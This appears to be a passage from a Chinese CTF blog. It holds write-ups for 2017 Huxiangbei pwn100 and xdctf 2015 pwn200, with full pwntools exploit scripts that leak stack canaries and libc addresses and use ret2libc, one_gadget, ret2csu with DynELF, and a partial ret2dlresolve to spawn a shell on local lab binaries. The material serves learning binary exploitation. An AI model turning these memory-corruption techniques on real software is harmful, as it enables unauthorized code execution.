<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line"><span class="number">1233</span></span><br><span class="line">Result <span class="keyword">is</span>:�m�</span><br><span class="line">Finish!</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>2.子进程触发canary：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Result <span class="keyword">is</span>:m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m�ۻ��<span class="number">4</span>�</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>3.子进程报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Something <span class="keyword">is</span> wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>总结归纳一下：</p>
<p>接收字符串中有“Finish”：当前字符串正确</p>
<p>接收字符串中有“wrong”：程序长度不对</p>
<p>不管canary是否正确，只要长度不对，程序就会输出一样的东西，这一点完美卡死了canary爆破，后来发现canary可以用“覆盖低字节的方式”打印出来（”\n”覆盖”\x00”，这里是printf，所以不覆盖也可以）</p>
<p>​        // 原本想用新学的canary爆破练练手，没想到被出题人制裁了</p>
<p>这采用常规接收数据的方式：（直接计算）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#这里必须加&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendine(payload)</span><br><span class="line">p.recvline() <span class="comment">#接收了&#x27;\n&#x27;（&#x27;\n&#x27;用printf打印出来的时候占一整排，用recvline接收正好）</span></span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] <span class="comment">#len(&#x27;Result is:&#x27;)+258，接收3字节（没有&quot;\x00&quot;）</span></span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br></pre></td></tr></table></figure>
<p>还有一种更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>) <span class="comment">#这里可以不加&quot;\n&quot;</span></span><br><span class="line">payload=  base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">258</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())	<span class="comment">#输出接收到的数据</span></span><br><span class="line">recv= p.recv()</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span>+recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">6</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary) <span class="comment">#rfind()返回字符串最后一次出现的位置</span></span><br></pre></td></tr></table></figure>
<p>我目前还不能理解这种收集数据的方式，但是它看起来还挺实用的，以后再研究</p>
<p>本题是给了libc库的，所以这么打：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> binascii     </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">p=process(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf_got= elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#注意：这里要多收集一个&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline() </span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] </span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(puts_plt)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(setbuf_got))</span><br><span class="line"><span class="comment">#程序用base64对输入值进行了加密，所以这里需要进行解密</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">recv= p.recv()</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line">setbuf_addr = u32(recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">7</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;setbuf_addr &gt;&gt; &quot;</span>+<span class="built_in">str</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&quot;system&quot;</span>] </span><br><span class="line">setbuf_offset=libc.symbols[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">system_addr=setbuf_addr+system_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">binsh_offset=<span class="number">0x192352</span>	</span><br><span class="line"><span class="comment">#strings -a -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; (直接输出16进制)</span></span><br><span class="line">binsh_addr = setbuf_addr+binsh_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(system_addr)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(binsh_addr))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>网上还有一个更nb的，自己找libc版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>], arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x08048B09&#x27;</span></span>):</span></span><br><span class="line">    raw_input(<span class="string">&#x27;debug:&#x27;</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = <span class="number">0x0003AC69</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/h11p/hackme/huxiangbei/pwns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x102</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[<span class="number">268</span>:<span class="number">271</span>]</span><br><span class="line">Canary=<span class="string">&quot;\x00&quot;</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(u32(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x151</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[<span class="number">347</span>:<span class="number">351</span>] <span class="comment">#直接开gdb看出来的</span></span><br><span class="line">base_libc=u32(mylibc)-<span class="number">0x18637</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;mylibc_addr:&quot;</span>+<span class="built_in">hex</span>(base_libc)</span><br><span class="line"></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc <span class="comment">#这个MAGIC是one_gadget</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x101</span>+Canary+<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p32(MAGIC_addr) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
<p>我和他的版本不同，我打不通也看不懂，以后再学</p>
<p>地址：<a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-gbecslst-no.html">2017湖湘杯pwn100的wp - JavaShuo</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/" class="post-title-link" itemprop="url">万能pop+DynELF经典组合(附加ret2dlresolve)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-03 14:07:28" itemprop="dateCreated datePublished" datetime="2022-01-03T14:07:28+08:00">2022-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 22:34:50" itemprop="dateModified" datetime="2022-01-04T22:34:50+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>事情的起因是我遇到了一道做过的题目，它的代码完全没有改变，只是程序变成了64位</p>
<p>以前我用DynELF直接打通了32位，现在来看64位发现少了一个gadget，于是我脑袋抽了，用“ret2dlresolve”搞了一上午</p>
<p>后来想到了利用“ret2csu”来控制DynELF中的“write”函数</p>
<p>发现这种组合的通用性还挺高，只要程序溢出至少“136字节”就可以打</p>
<p>于是想记录一下，让今后的我少走点弯路</p>
<hr>
<p><strong>2015-xdctf-pwn200</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183143407.png" alt="1641183143407"> </p>
<p>一次输入</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183182063.png" alt="1641183182063"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183191422.png" alt="1641183191422"> </p>
<p>64位，dynamically，开了NX</p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183209046.png" alt="1641183209046"> </p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183233342.png" alt="1641183233342"> </p>
<p>没有system，没有“/bin/sh”</p>
<p>函数write可以输出的值就是字符串的长度“23字节”</p>
<p>vuln中有read，可以输入“256字节”</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/1641183449006.png" alt="1641183449006"> </p>
<p>程序溢出了“144字节”，有write函数，可以有多种方法打通</p>
<p><strong>DynELF</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x40066E</span></span><br><span class="line">fun_addr=<span class="number">0x400637</span> </span><br><span class="line">bss_addr=<span class="number">0x601050</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x000000000400780</span></span><br><span class="line">csu_end_addr=<span class="number">0x00000000040079A</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">	csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br><span class="line">	data=p.recv(<span class="number">8</span>)</span><br><span class="line">	log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">		</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">execve_addr=d.lookup(<span class="string">&#x27;execve&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve_addr: &quot;</span>+<span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>注意：</strong>(每一条都是血的教训)</p>
<p>因为DynELF模块在执行的过程中会输出一下字符串，所以“p.recvuntil”必须有</p>
<p>不同程序的csu可能不同，有时需要修改模板</p>
<p>另外我也尝试过用“system”但是打不通（可能是环境问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, addr, <span class="number">8</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>用csu包装的函数视乎只认识GOT表，用其他的就报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(execve_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr, <span class="built_in">len</span>(payload), main_addr)</span><br><span class="line"><span class="comment">#read(0, bss_addr, len(payload))</span></span><br><span class="line">p.send(payload)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, bss_addr+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br></pre></td></tr></table></figure>
<p>必须利用“read”把泄露出来的“execve”写在某个地址上，只有这样才可以调用“execve”</p>
<p>​        //我也尝试过用其他姿势来调用“execve”，但是都报错了</p>
<hr>
<p><strong>ret2dlresolve</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>) <span class="comment">#程序使用这个库文件</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line"><span class="comment">#目标函数和已知函数的偏移（把‘write’重定位成‘system’）</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span> </span><br><span class="line">plt_load = <span class="number">0x400506</span> <span class="comment">#plt[1](dl_runtime_resolve)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    <span 